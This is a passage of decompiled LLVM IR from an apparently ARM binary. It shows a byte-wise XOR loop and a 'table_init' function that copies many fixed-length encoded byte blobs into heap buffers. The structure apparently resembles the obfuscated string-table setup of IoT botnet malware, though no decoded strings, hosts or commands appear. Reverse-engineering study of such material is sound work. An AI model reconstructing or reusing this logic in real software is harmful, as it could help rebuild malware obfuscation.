  %v2_10ef8 = add i32 %v0_10ef8, %v2_10ef4
  %v3_10ef8 = inttoptr i32 %v2_10ef8 to i8*
  %v4_10ef8 = load i8, i8* %v3_10ef8, align 1
  %v6_10ef8 = zext i8 %v4_10ef8 to i32
  %v0_10efc = load i32, i32* %r4.global-to-local, align 4
  %v2_10efc = xor i32 %v0_10efc, %v6_10ef8
  store i32 %v2_10efc, i32* @r3, align 4
  %v1_10f00 = trunc i32 %v2_10efc to i8
  store i8 %v1_10f00, i8* %v3_10ef8, align 1
  %v3_10f04 = load i16, i16* %v2_10e98, align 4
  %v4_10f04 = zext i16 %v3_10f04 to i32
  %v0_10f08 = load i32, i32* @ip, align 4
  %v1_10f08 = add i32 %v0_10f08, 1
  store i32 %v1_10f08, i32* @ip, align 4
  %v8_10f10 = icmp sgt i32 %v4_10f04, %v1_10f08
  br i1 %v8_10f10, label %dec_label_pc_10ec4.dec_label_pc_10ec4_crit_edge, label %dec_label_pc_10f14.loopexit

dec_label_pc_10ec4.dec_label_pc_10ec4_crit_edge:  ; preds = %dec_label_pc_10ec4
  %v0_10ecc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10ec4

dec_label_pc_10f14.loopexit:                      ; preds = %dec_label_pc_10ec4
  %v2_10f14.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10f14

dec_label_pc_10f14:                               ; preds = %dec_label_pc_10f14.loopexit, %entry
  %v2_10f14 = phi i32 [ %v2_10f14.pre, %dec_label_pc_10f14.loopexit ], [ %v3_10ea8, %entry ]
  store i32 %v2_10f14, i32* @r4, align 4
  ret i32 %v2_10e90

; uselistorder directives
  uselistorder i32 %v1_10f08, { 1, 2, 0 }
  uselistorder i32 %v1_10eb8, { 1, 0 }
  uselistorder i32 %v3_10ea4, { 1, 0 }
  uselistorder i32 %v2_10e94, { 3, 0, 1, 2 }
  uselistorder i32 %v3_10e8c, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_10f24 = load i32, i32* @r4, align 4
  %v6_10f24 = load i32, i32* @r5, align 4
  %v9_10f24 = load i32, i32* @r6, align 4
  %v12_10f24 = load i32, i32* @r7, align 4
  %v15_10f24 = load i32, i32* @r8, align 4
  %v21_10f24 = load i32, i32* @sl, align 4
  %v24_10f24 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_10f30 = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_26134.272 to i32), i32* @r4, align 4
  store i32 %v0_10f30, i32* @r6, align 4
  %v3_10f48 = call i32 @util_memcpy(i32 %v0_10f30, i32 ptrtoint (i32* @global_var_1a8ec.280 to i32), i32 2)
  %v0_10f4c = load i32, i32* @r5, align 4
  store i32 %v0_10f4c, i32* @r0, align 4
  %v0_10f50 = load i32, i32* @r6, align 4
  store i32 %v0_10f50, i32* @global_var_26144.281, align 4
  %v1_10f54 = trunc i32 %v0_10f4c to i16
  store i16 %v1_10f54, i16* bitcast (i32* @global_var_26148.282 to i16*), align 4
  %v0_10f58 = call i32 @malloc()
  %v0_10f5c = load i32, i32* @r5, align 4
  store i32 %v0_10f58, i32* @r6, align 4
  %v3_10f68 = call i32 @util_memcpy(i32 %v0_10f58, i32 ptrtoint (i32* @global_var_1a8f0.284 to i32), i32 %v0_10f5c)
  store i32 19, i32* @r0, align 4
  %v0_10f70 = load i32, i32* @r6, align 4
  store i32 %v0_10f70, i32* @global_var_26154.285, align 4
  %v0_10f74 = load i32, i32* @r5, align 4
  %v1_10f74 = trunc i32 %v0_10f74 to i16
  store i16 %v1_10f74, i16* bitcast (i32* @global_var_26158.286 to i16*), align 4
  %v0_10f78 = call i32 @malloc()
  store i32 19, i32* @fp, align 4
  store i32 %v0_10f78, i32* @r5, align 4
  %v4_10f8c = call i32 @util_memcpy(i32 %v0_10f78, i32 ptrtoint ([20 x i8]* @global_var_1a8f4.288 to i32), i32 19)
  store i32 7, i32* @r0, align 4
  %v0_10f94 = load i32, i32* @r5, align 4
  store i32 %v0_10f94, i32* @global_var_2615c.289, align 4
  %v0_10f98 = load i32, i32* @fp, align 4
  %v1_10f98 = trunc i32 %v0_10f98 to i16
  store i16 %v1_10f98, i16* bitcast (i32* @global_var_26160.290 to i16*), align 4
  %v0_10f9c = call i32 @malloc()
  store i32 7, i32* @r7, align 4
  store i32 %v0_10f9c, i32* @r5, align 4
  %v3_10fb0 = call i32 @util_memcpy(i32 %v0_10f9c, i32 ptrtoint (i32* @global_var_1a908.292 to i32), i32 7)
  store i32 5, i32* @r0, align 4
  %v0_10fb8 = load i32, i32* @r5, align 4
  store i32 %v0_10fb8, i32* @global_var_26164.293, align 4
  %v0_10fbc = load i32, i32* @r7, align 4
  %v1_10fbc = trunc i32 %v0_10fbc to i16
  store i16 %v1_10fbc, i16* bitcast (i32* @global_var_26168.294 to i16*), align 4
  %v0_10fc0 = call i32 @malloc()
  store i32 %v0_10fc0, i32* @r5, align 4
  %v3_10fd0 = call i32 @util_memcpy(i32 %v0_10fc0, i32 ptrtoint (i32* @global_var_1a910.296 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_10fdc = load i32, i32* @r5, align 4
  store i32 %v0_10fdc, i32* @global_var_2616c.297, align 4
  store i16 5, i16* bitcast (i32* @global_var_26170.298 to i16*), align 4
  %v0_10fe4 = call i32 @malloc()
  store i32 %v0_10fe4, i32* @r5, align 4
  %v3_10ff4 = call i32 @util_memcpy(i32 %v0_10fe4, i32 ptrtoint (i32* @global_var_1a918.300 to i32), i32 4)
  store i32 14, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_26178.301 to i16*), align 4
  %v0_11004 = load i32, i32* @r5, align 4
  store i32 %v0_11004, i32* @global_var_26174.302, align 4
  %v0_11008 = call i32 @malloc()
  store i32 14, i32* @r6, align 4
  store i32 %v0_11008, i32* @r5, align 4
  %v3_1101c = call i32 @util_memcpy(i32 %v0_11008, i32 ptrtoint (i32* @global_var_1a920.304 to i32), i32 14)
  store i32 6, i32* @r0, align 4
  %v0_11024 = load i32, i32* @r5, align 4
  store i32 %v0_11024, i32* @global_var_2617c.305, align 4
  %v0_11028 = load i32, i32* @r6, align 4
  %v1_11028 = trunc i32 %v0_11028 to i16
  store i16 %v1_11028, i16* bitcast (i32* @global_var_26180.306 to i16*), align 4
  %v0_1102c = call i32 @malloc()
  store i32 6, i32* @r8, align 4
  store i32 %v0_1102c, i32* @r5, align 4
  %v3_11040 = call i32 @util_memcpy(i32 %v0_1102c, i32 ptrtoint (i32* @global_var_1a930.308 to i32), i32 6)
  store i32 8, i32* @r0, align 4
  %v0_11048 = load i32, i32* @r5, align 4
  store i32 %v0_11048, i32* @global_var_26184.309, align 4
  %v0_1104c = load i32, i32* @r8, align 4
  %v1_1104c = trunc i32 %v0_1104c to i16
  store i16 %v1_1104c, i16* bitcast (i32* @global_var_26188.310 to i16*), align 4
  %v0_11050 = call i32 @malloc()
  store i32 8, i32* @sl, align 4
  store i32 %v0_11050, i32* @r5, align 4
  %v3_11064 = call i32 @util_memcpy(i32 %v0_11050, i32 ptrtoint (i32* @global_var_1a938.312 to i32), i32 8)
  %v0_11068 = load i32, i32* @r7, align 4
  store i32 %v0_11068, i32* @r0, align 4
  %v0_1106c = load i32, i32* @r5, align 4
  store i32 %v0_1106c, i32* @global_var_2618c.313, align 4
  %v0_11070 = load i32, i32* @sl, align 4
  %v1_11070 = trunc i32 %v0_11070 to i16
  store i16 %v1_11070, i16* bitcast (i32* @global_var_26190.314 to i16*), align 4
  %v0_11074 = call i32 @malloc()
  %v0_11078 = load i32, i32* @r7, align 4
  store i32 %v0_11074, i32* @r5, align 4
  %v3_11084 = call i32 @util_memcpy(i32 %v0_11074, i32 ptrtoint (i32* @global_var_1a944.316 to i32), i32 %v0_11078)
  store i32 16, i32* @r0, align 4
  %v0_1108c = load i32, i32* @r5, align 4
  store i32 %v0_1108c, i32* @global_var_26194.317, align 4
  %v0_11090 = load i32, i32* @r7, align 4
  %v1_11090 = trunc i32 %v0_11090 to i16
  store i16 %v1_11090, i16* bitcast (i32* @global_var_26198.318 to i16*), align 4
  %v0_11094 = call i32 @malloc()
  store i32 %v0_11094, i32* @r5, align 4
  %v3_110a4 = call i32 @util_memcpy(i32 %v0_11094, i32 ptrtoint (i32* @global_var_1a94c.320 to i32), i32 16)
  %v0_110ac = load i32, i32* @r6, align 4
  store i32 %v0_110ac, i32* @r0, align 4
  %v0_110b0 = load i32, i32* @r5, align 4
  store i32 %v0_110b0, i32* @global_var_2619c.321, align 4
  store i16 16, i16* bitcast (i32* @global_var_261a0.322 to i16*), align 4
  %v0_110b8 = call i32 @malloc()
  %v0_110bc = load i32, i32* @r6, align 4
  store i32 %v0_110b8, i32* @r5, align 4
  %v3_110c8 = call i32 @util_memcpy(i32 %v0_110b8, i32 ptrtoint (i32* @global_var_1a960.324 to i32), i32 %v0_110bc)
  store i32 9, i32* @r0, align 4
  %v0_110d0 = load i32, i32* @r5, align 4
  store i32 %v0_110d0, i32* @global_var_261a4.325, align 4
  %v0_110d4 = load i32, i32* @r6, align 4
  %v1_110d4 = trunc i32 %v0_110d4 to i16
  store i16 %v1_110d4, i16* bitcast (i32* @global_var_261a8.326 to i16*), align 4
  %v0_110d8 = call i32 @malloc()
  store i32 9, i32* @sb, align 4
  store i32 %v0_110d8, i32* @r5, align 4
  %v3_110ec = call i32 @util_memcpy(i32 %v0_110d8, i32 ptrtoint (i32* @global_var_1a970.328 to i32), i32 9)
  %v0_110f0 = load i32, i32* @fp, align 4
  store i32 %v0_110f0, i32* @r0, align 4
  %v0_110f4 = load i32, i32* @r5, align 4
  store i32 %v0_110f4, i32* @global_var_261ac.329, align 4
  %v0_110f8 = load i32, i32* @sb, align 4
  %v1_110f8 = trunc i32 %v0_110f8 to i16
  store i16 %v1_110f8, i16* bitcast (i32* @global_var_261b0.330 to i16*), align 4
  %v0_110fc = call i32 @malloc()
  %v0_11104 = load i32, i32* @fp, align 4
  store i32 %v0_110fc, i32* @r5, align 4
  %v3_1110c = call i32 @util_memcpy(i32 %v0_110fc, i32 ptrtoint (i32* @global_var_1a97c.332 to i32), i32 %v0_11104)
  store i32 23, i32* @r0, align 4
  %v0_11114 = load i32, i32* @r5, align 4
  store i32 %v0_11114, i32* @global_var_261b4.333, align 4
  %v0_11118 = load i32, i32* @fp, align 4
  %v1_11118 = trunc i32 %v0_11118 to i16
  store i16 %v1_11118, i16* bitcast (i32* @global_var_261b8.334 to i16*), align 4
  %v0_1111c = call i32 @malloc()
  store i32 %v0_1111c, i32* @r5, align 4
  %v3_1112c = call i32 @util_memcpy(i32 %v0_1111c, i32 ptrtoint (i32* @global_var_1a990.336 to i32), i32 23)
  %v0_11134 = load i32, i32* @sl, align 4
  store i32 %v0_11134, i32* @r0, align 4
  store i16 23, i16* bitcast (i32* @global_var_261c0.337 to i16*), align 4
  %v0_1113c = load i32, i32* @r5, align 4
  store i32 %v0_1113c, i32* @global_var_261bc.338, align 4
  %v0_11140 = call i32 @malloc()
  %v0_11148 = load i32, i32* @sl, align 4
  store i32 %v0_11140, i32* @r5, align 4
  %v4_11150 = call i32 @util_memcpy(i32 %v0_11140, i32 ptrtoint ([9 x i8]* @global_var_1a9a8.340 to i32), i32 %v0_11148)
  %v0_11154 = load i32, i32* @r6, align 4
  store i32 %v0_11154, i32* @r0, align 4
  %v0_11158 = load i32, i32* @r5, align 4
  store i32 %v0_11158, i32* @global_var_261c4.341, align 4
  %v0_1115c = load i32, i32* @sl, align 4
  %v1_1115c = trunc i32 %v0_1115c to i16
  store i16 %v1_1115c, i16* bitcast (i32* @global_var_261c8.342 to i16*), align 4
  %v0_11160 = call i32 @malloc()
  %v0_11164 = load i32, i32* @r6, align 4
  store i32 %v0_11160, i32* @r5, align 4
  %v3_11170 = call i32 @util_memcpy(i32 %v0_11160, i32 ptrtoint (i32* @global_var_1a9b4.344 to i32), i32 %v0_11164)
  %v0_11174 = load i32, i32* @fp, align 4
  store i32 %v0_11174, i32* @r0, align 4
  %v0_11178 = load i32, i32* @r5, align 4
  store i32 %v0_11178, i32* @global_var_261cc.345, align 4
  %v0_1117c = load i32, i32* @r6, align 4
  %v1_1117c = trunc i32 %v0_1117c to i16
  store i16 %v1_1117c, i16* bitcast (i32* @global_var_261d0.346 to i16*), align 4
  %v0_11180 = call i32 @malloc()
  %v0_11188 = load i32, i32* @fp, align 4
  store i32 %v0_11180, i32* @r5, align 4
  %v3_11190 = call i32 @util_memcpy(i32 %v0_11180, i32 ptrtoint (i32* @global_var_1a9c4.348 to i32), i32 %v0_11188)
  store i32 23, i32* @r0, align 4
  %v0_11198 = load i32, i32* @r5, align 4
  store i32 %v0_11198, i32* @global_var_261d4.349, align 4
  %v0_1119c = load i32, i32* @fp, align 4
  %v1_1119c = trunc i32 %v0_1119c to i16
  store i16 %v1_1119c, i16* bitcast (i32* @global_var_261d8.350 to i16*), align 4
  %v0_111a0 = call i32 @malloc()
  store i32 %v0_111a0, i32* @r5, align 4
  %v3_111b0 = call i32 @util_memcpy(i32 %v0_111a0, i32 ptrtoint (i32* @global_var_1a9d8.352 to i32), i32 23)
  store i32 24, i32* @r0, align 4
  %v0_111bc = load i32, i32* @r5, align 4
  store i32 %v0_111bc, i32* @global_var_261dc.353, align 4
  store i16 23, i16* bitcast (i32* @global_var_261e0.354 to i16*), align 4
  %v0_111c4 = call i32 @malloc()
  %v0_111d0 = load i32, i32* @r6, align 4
  %v1_111d0 = add i32 %v0_111d0, 10
  store i32 %v1_111d0, i32* @r6, align 4
  store i32 %v0_111c4, i32* @r5, align 4
  %v3_111d8 = call i32 @util_memcpy(i32 %v0_111c4, i32 ptrtoint (i32* @global_var_1a9f0.356 to i32), i32 24)
  store i32 15, i32* @r0, align 4
  %v0_111e0 = load i32, i32* @r5, align 4
  store i32 %v0_111e0, i32* @global_var_261e4.357, align 4
  %v0_111e4 = load i32, i32* @r6, align 4
  %v1_111e4 = trunc i32 %v0_111e4 to i16
  store i16 %v1_111e4, i16* bitcast (i32* @global_var_261e8.358 to i16*), align 4
  %v0_111e8 = call i32 @malloc()
  store i32 %v0_111e8, i32* @r5, align 4
  %v3_111f8 = call i32 @util_memcpy(i32 %v0_111e8, i32 ptrtoint (i32* @global_var_1aa0c.360 to i32), i32 15)
  %v0_11200 = load i32, i32* @r8, align 4
  store i32 %v0_11200, i32* @r0, align 4
  store i16 15, i16* bitcast (i32* @global_var_261f0.361 to i16*), align 4
  %v0_11208 = load i32, i32* @r5, align 4
  store i32 %v0_11208, i32* @global_var_261ec.362, align 4
  %v0_1120c = call i32 @malloc()
  %v0_11210 = load i32, i32* @r8, align 4
  store i32 %v0_1120c, i32* @r5, align 4
  %v4_1121c = call i32 @util_memcpy(i32 %v0_1120c, i32 ptrtoint ([7 x i8]* @global_var_1aa1c.364 to i32), i32 %v0_11210)
  %v0_11220 = load i32, i32* @r7, align 4
  store i32 %v0_11220, i32* @r0, align 4
  %v0_11224 = load i32, i32* @r5, align 4
  store i32 %v0_11224, i32* @global_var_261f4.365, align 4
  %v0_11228 = load i32, i32* @r8, align 4
  %v1_11228 = trunc i32 %v0_11228 to i16
  store i16 %v1_11228, i16* bitcast (i32* @global_var_261f8.366 to i16*), align 4
  %v0_1122c = call i32 @malloc()
  %v0_11230 = load i32, i32* @r7, align 4
  store i32 %v0_1122c, i32* @r5, align 4
  %v4_1123c = call i32 @util_memcpy(i32 %v0_1122c, i32 ptrtoint ([8 x i8]* @global_var_1aa24.368 to i32), i32 %v0_11230)
  %v0_11240 = load i32, i32* @r7, align 4
  store i32 %v0_11240, i32* @r0, align 4
  %v0_11244 = load i32, i32* @r5, align 4
  store i32 %v0_11244, i32* @global_var_261fc.369, align 4
  %v1_11248 = trunc i32 %v0_11240 to i16
  store i16 %v1_11248, i16* bitcast (i32* @global_var_26200.370 to i16*), align 4
  %v0_1124c = call i32 @malloc()
  %v0_11250 = load i32, i32* @r7, align 4
  store i32 %v0_1124c, i32* @r5, align 4
  %v4_1125c = call i32 @util_memcpy(i32 %v0_1124c, i32 ptrtoint ([8 x i8]* @global_var_1aa2c.372 to i32), i32 %v0_11250)
  store i32 3, i32* @r0, align 4
  %v0_11264 = load i32, i32* @r5, align 4
  store i32 %v0_11264, i32* @global_var_26204.373, align 4
  %v0_11268 = load i32, i32* @r7, align 4
  %v1_11268 = trunc i32 %v0_11268 to i16
  store i16 %v1_11268, i16* bitcast (i32* @global_var_26208.374 to i16*), align 4
  %v0_1126c = call i32 @malloc()
  store i32 %v0_1126c, i32* @r5, align 4
  %v4_1127c = call i32 @util_memcpy(i32 %v0_1126c, i32 ptrtoint ([4 x i8]* @global_var_1aa34.376 to i32), i32 3)
  %v0_11284 = load i32, i32* @r6, align 4
  store i32 %v0_11284, i32* @r0, align 4
  %v0_11288 = load i32, i32* @r5, align 4
  store i32 %v0_11288, i32* @global_var_2620c.377, align 4
  store i16 3, i16* bitcast (i32* @global_var_26210.378 to i16*), align 4
  %v0_11290 = call i32 @malloc()
  %v0_11294 = load i32, i32* @r6, align 4
  store i32 %v0_11290, i32* @r5, align 4
  %v3_112a0 = call i32 @util_memcpy(i32 %v0_11290, i32 ptrtoint (i32* @global_var_1aa38.380 to i32), i32 %v0_11294)
  store i32 29, i32* @r0, align 4
  %v0_112a8 = load i32, i32* @r5, align 4
  store i32 %v0_112a8, i32* @global_var_26214.381, align 4
  %v0_112ac = load i32, i32* @r6, align 4
  %v1_112ac = trunc i32 %v0_112ac to i16
  store i16 %v1_112ac, i16* bitcast (i32* @global_var_26218.382 to i16*), align 4
  %v0_112b0 = call i32 @malloc()
  store i32 %v0_112b0, i32* @r5, align 4
  %v3_112c0 = call i32 @util_memcpy(i32 %v0_112b0, i32 ptrtoint (i32* @global_var_1aa54.384 to i32), i32 29)
  %v0_112c8 = load i32, i32* @sb, align 4
  store i32 %v0_112c8, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_26220.385 to i16*), align 4
  %v0_112d0 = load i32, i32* @r5, align 4
  store i32 %v0_112d0, i32* @global_var_2621c.386, align 4
  %v0_112d4 = call i32 @malloc()
  %v0_112dc = load i32, i32* @sb, align 4
  store i32 %v0_112d4, i32* @r5, align 4
  %v4_112e4 = call i32 @util_memcpy(i32 %v0_112d4, i32 ptrtoint ([10 x i8]* @global_var_1aa74.388 to i32), i32 %v0_112dc)
  %v0_112e8 = load i32, i32* @sl, align 4
  store i32 %v0_112e8, i32* @r0, align 4
  %v0_112ec = load i32, i32* @r5, align 4
  store i32 %v0_112ec, i32* @global_var_26224.389, align 4
  %v0_112f0 = load i32, i32* @sb, align 4
  %v1_112f0 = trunc i32 %v0_112f0 to i16
  store i16 %v1_112f0, i16* bitcast (i32* @global_var_26228.390 to i16*), align 4
  %v0_112f4 = call i32 @malloc()
  %v0_112fc = load i32, i32* @sl, align 4
  store i32 %v0_112f4, i32* @r5, align 4
  %v4_11304 = call i32 @util_memcpy(i32 %v0_112f4, i32 ptrtoint ([9 x i8]* @global_var_1a9a8.340 to i32), i32 %v0_112fc)
  store i32 5, i32* @r0, align 4
  %v0_1130c = load i32, i32* @r5, align 4
  store i32 %v0_1130c, i32* @global_var_2622c.391, align 4
  %v0_11310 = load i32, i32* @sl, align 4
  %v1_11310 = trunc i32 %v0_11310 to i16
  store i16 %v1_11310, i16* bitcast (i32* @global_var_26230.392 to i16*), align 4
  %v0_11314 = call i32 @malloc()
  store i32 %v0_11314, i32* @r5, align 4
  %v4_11324 = call i32 @util_memcpy(i32 %v0_11314, i32 ptrtoint ([6 x i8]* @global_var_1aa80.394 to i32), i32 5)
  %v0_11330 = load i32, i32* @r8, align 4
  store i32 %v0_11330, i32* @r0, align 4
  %v2_11334 = load i32, i32* @r4, align 4
  %v4_11334 = add i32 %v2_11334, 260
  %v5_11334 = inttoptr i32 %v4_11334 to i16*
  store i16 5, i16* %v5_11334, align 2
  %v0_11338 = load i32, i32* @r5, align 4
  store i32 %v0_11338, i32* @global_var_26234.395, align 4
  %v0_1133c = call i32 @malloc()
  %v0_11340 = load i32, i32* @r8, align 4
  store i32 %v0_1133c, i32* @r5, align 4
  %v4_1134c = call i32 @util_memcpy(i32 %v0_1133c, i32 ptrtoint ([7 x i8]* @global_var_1aa88.397 to i32), i32 %v0_11340)
  store i32 16, i32* @r0, align 4
  %v0_11358 = load i32, i32* @r8, align 4
  %v1_11358 = trunc i32 %v0_11358 to i16
  %v2_11358 = load i32, i32* @r4, align 4
  %v4_11358 = add i32 %v2_11358, 268
  %v5_11358 = inttoptr i32 %v4_11358 to i16*
  store i16 %v1_11358, i16* %v5_11358, align 2
  %v0_1135c = load i32, i32* @r5, align 4
  store i32 %v0_1135c, i32* @global_var_2623c.398, align 4
  %v0_11360 = call i32 @malloc()
  store i32 %v0_11360, i32* @r5, align 4
  %v3_11370 = call i32 @util_memcpy(i32 %v0_11360, i32 ptrtoint (i32* @global_var_1aa90.400 to i32), i32 16)
  store i32 21, i32* @r0, align 4
  store i32 21, i32* @r8, align 4
  %v2_11384 = load i32, i32* @r4, align 4
  %v4_11384 = add i32 %v2_11384, 276
  %v5_11384 = inttoptr i32 %v4_11384 to i16*
  store i16 16, i16* %v5_11384, align 2
  %v0_11388 = load i32, i32* @r5, align 4
  store i32 %v0_11388, i32* @global_var_26244.401, align 4
  %v0_1138c = call i32 @malloc()
  %v0_11394 = load i32, i32* @r8, align 4
  store i32 %v0_1138c, i32* @r5, align 4
  %v3_1139c = call i32 @util_memcpy(i32 %v0_1138c, i32 ptrtoint (i32* @global_var_1aaa4.403 to i32), i32 %v0_11394)
  %v0_113a4 = load i32, i32* @r8, align 4
  store i32 %v0_113a4, i32* @r0, align 4
  %v1_113a8 = trunc i32 %v0_113a4 to i16
  %v2_113a8 = load i32, i32* @r4, align 4
  %v4_113a8 = add i32 %v2_113a8, 284
  %v5_113a8 = inttoptr i32 %v4_113a8 to i16*
  store i16 %v1_113a8, i16* %v5_113a8, align 2
  %v0_113ac = load i32, i32* @r5, align 4
  store i32 %v0_113ac, i32* @global_var_2624c.404, align 4
  %v0_113b0 = call i32 @malloc()
  %v0_113b8 = load i32, i32* @r8, align 4
  store i32 %v0_113b0, i32* @r5, align 4
  %v3_113c0 = call i32 @util_memcpy(i32 %v0_113b0, i32 ptrtoint (i32* @global_var_1aabc.406 to i32), i32 %v0_113b8)
  store i32 17, i32* @r0, align 4
  %v0_113cc = load i32, i32* @r8, align 4
  %v1_113cc = trunc i32 %v0_113cc to i16
  %v2_113cc = load i32, i32* @r4, align 4
  %v4_113cc = add i32 %v2_113cc, 292
  %v5_113cc = inttoptr i32 %v4_113cc to i16*
  store i16 %v1_113cc, i16* %v5_113cc, align 2
  %v0_113d0 = load i32, i32* @r5, align 4
  store i32 %v0_113d0, i32* @global_var_26254.407, align 4
  %v0_113d4 = call i32 @malloc()
  store i32 %v0_113d4, i32* @r5, align 4
  %v3_113e4 = call i32 @util_memcpy(i32 %v0_113d4, i32 ptrtoint (i32* @global_var_1aad4.409 to i32), i32 17)
  store i32 11, i32* @r0, align 4
  %v2_113f4 = load i32, i32* @r4, align 4
  %v4_113f4 = add i32 %v2_113f4, 300
  %v5_113f4 = inttoptr i32 %v4_113f4 to i16*
  store i16 17, i16* %v5_113f4, align 2
  %v0_113f8 = load i32, i32* @r5, align 4
  store i32 %v0_113f8, i32* @global_var_2625c.410, align 4
  %v0_113fc = call i32 @malloc()
  %v0_11408 = load i32, i32* @r7, align 4
  %v1_11408 = add i32 %v0_11408, 4
  store i32 %v1_11408, i32* @r7, align 4
  store i32 %v0_113fc, i32* @r5, align 4
  %v4_11410 = call i32 @util_memcpy(i32 %v0_113fc, i32 ptrtoint ([12 x i8]* @global_var_1aae8.412 to i32), i32 11)
  store i32 23, i32* @r0, align 4
  %v0_1141c = load i32, i32* @r7, align 4
  %v1_1141c = trunc i32 %v0_1141c to i16
  %v2_1141c = load i32, i32* @r4, align 4
  %v4_1141c = add i32 %v2_1141c, 308
  %v5_1141c = inttoptr i32 %v4_1141c to i16*
  store i16 %v1_1141c, i16* %v5_1141c, align 2
  %v0_11420 = load i32, i32* @r5, align 4
  store i32 %v0_11420, i32* @global_var_26264.413, align 4
  %v0_11424 = call i32 @malloc()
  store i32 %v0_11424, i32* @r5, align 4
  %v3_11434 = call i32 @util_memcpy(i32 %v0_11424, i32 ptrtoint (i32* @global_var_1aaf4.415 to i32), i32 23)
  store i32 83, i32* @r0, align 4
  %v2_11444 = load i32, i32* @r4, align 4
  %v4_11444 = add i32 %v2_11444, 316
  %v5_11444 = inttoptr i32 %v4_11444 to i16*
  store i16 23, i16* %v5_11444, align 2
  %v0_11448 = load i32, i32* @r5, align 4
  store i32 %v0_11448, i32* @global_var_2626c.416, align 4
  %v0_1144c = call i32 @malloc()
  store i32 %v0_1144c, i32* @r5, align 4
  %v3_1145c = call i32 @util_memcpy(i32 %v0_1144c, i32 ptrtoint (i32* @global_var_1ae64.418 to i32), i32 83)
  store i32 32, i32* @r0, align 4
  %v2_1146c = load i32, i32* @r4, align 4
  %v4_1146c = add i32 %v2_1146c, 324
  %v5_1146c = inttoptr i32 %v4_1146c to i16*
  store i16 83, i16* %v5_1146c, align 2
  %v0_11470 = load i32, i32* @r5, align 4
  store i32 %v0_11470, i32* @global_var_26274.419, align 4
  %v0_11474 = call i32 @malloc()
  store i32 %v0_11474, i32* @r5, align 4
  %v3_11484 = call i32 @util_memcpy(i32 %v0_11474, i32 ptrtoint (i32* @global_var_1aeb8.421 to i32), i32 32)
  store i32 48, i32* @r0, align 4
  %v2_11494 = load i32, i32* @r4, align 4
  %v4_11494 = add i32 %v2_11494, 332
  %v5_11494 = inttoptr i32 %v4_11494 to i16*
  store i16 32, i16* %v5_11494, align 2
  %v0_11498 = load i32, i32* @r5, align 4
  store i32 %v0_11498, i32* @global_var_2627c.422, align 4
  %v0_1149c = call i32 @malloc()
  store i32 %v0_1149c, i32* @r5, align 4
  %v3_114ac = call i32 @util_memcpy(i32 %v0_1149c, i32 ptrtoint (i32* @global_var_1ab0c.424 to i32), i32 48)
  store i32 12, i32* @r0, align 4
  %v2_114bc = load i32, i32* @r4, align 4
  %v4_114bc = add i32 %v2_114bc, 340
  %v5_114bc = inttoptr i32 %v4_114bc to i16*
  store i16 48, i16* %v5_114bc, align 2
  %v0_114c0 = load i32, i32* @r5, align 4
  store i32 %v0_114c0, i32* @global_var_26284.425, align 4
  %v0_114c4 = call i32 @malloc()
  %v0_114d0 = load i32, i32* @r6, align 4
  %v1_114d0 = add i32 %v0_114d0, -12
  store i32 %v1_114d0, i32* @r6, align 4
  store i32 %v0_114c4, i32* @r5, align 4
  %v3_114d8 = call i32 @util_memcpy(i32 %v0_114c4, i32 ptrtoint (i32* @global_var_1ab40.427 to i32), i32 12)
  %v0_114e0 = load i32, i32* @sb, align 4
  store i32 %v0_114e0, i32* @r0, align 4
  %v0_114e4 = load i32, i32* @r6, align 4
  %v1_114e4 = trunc i32 %v0_114e4 to i16
  %v2_114e4 = load i32, i32* @r4, align 4
  %v4_114e4 = add i32 %v2_114e4, 348
  %v5_114e4 = inttoptr i32 %v4_114e4 to i16*
  store i16 %v1_114e4, i16* %v5_114e4, align 2
  %v0_114e8 = load i32, i32* @r5, align 4
  store i32 %v0_114e8, i32* @global_var_2628c.428, align 4
  %v0_114ec = call i32 @malloc()
  %v0_114f4 = load i32, i32* @sb, align 4
  store i32 %v0_114ec, i32* @r5, align 4
  %v3_114fc = call i32 @util_memcpy(i32 %v0_114ec, i32 ptrtoint (i32* @global_var_1ab50.430 to i32), i32 %v0_114f4)
  store i32 10, i32* @r0, align 4
  %v0_11508 = load i32, i32* @sb, align 4
  %v1_11508 = trunc i32 %v0_11508 to i16
  %v2_11508 = load i32, i32* @r4, align 4
  %v4_11508 = add i32 %v2_11508, 356
  %v5_11508 = inttoptr i32 %v4_11508 to i16*
  store i16 %v1_11508, i16* %v5_11508, align 2
  %v0_1150c = load i32, i32* @r5, align 4
  store i32 %v0_1150c, i32* @global_var_26294.431, align 4
  %v0_11510 = call i32 @malloc()
  store i32 %v0_11510, i32* @r5, align 4
  %v3_11520 = call i32 @util_memcpy(i32 %v0_11510, i32 ptrtoint (i32* @global_var_1ab5c.433 to i32), i32 10)
  %v0_1152c = load i32, i32* @r6, align 4
  store i32 %v0_1152c, i32* @r0, align 4
  %v2_11530 = load i32, i32* @r4, align 4
  %v4_11530 = add i32 %v2_11530, 364
  %v5_11530 = inttoptr i32 %v4_11530 to i16*
  store i16 10, i16* %v5_11530, align 2
  %v0_11534 = load i32, i32* @r5, align 4
  store i32 %v0_11534, i32* @global_var_2629c.434, align 4
  %v0_11538 = call i32 @malloc()
  %v0_1153c = load i32, i32* @r6, align 4
  store i32 %v0_11538, i32* @r5, align 4
  %v3_11548 = call i32 @util_memcpy(i32 %v0_11538, i32 ptrtoint (i32* @global_var_1ab68.436 to i32), i32 %v0_1153c)
  store i32 16, i32* @r0, align 4
  %v0_11554 = load i32, i32* @r6, align 4
  %v1_11554 = trunc i32 %v0_11554 to i16
  %v2_11554 = load i32, i32* @r4, align 4
  %v4_11554 = add i32 %v2_11554, 372
  %v5_11554 = inttoptr i32 %v4_11554 to i16*
  store i16 %v1_11554, i16* %v5_11554, align 2
  %v0_11558 = load i32, i32* @r5, align 4
  store i32 %v0_11558, i32* @global_var_262a4.437, align 4
  %v0_1155c = call i32 @malloc()
  store i32 %v0_1155c, i32* @r5, align 4
  %v3_1156c = call i32 @util_memcpy(i32 %v0_1155c, i32 ptrtoint (i32* @global_var_1ab78.439 to i32), i32 16)
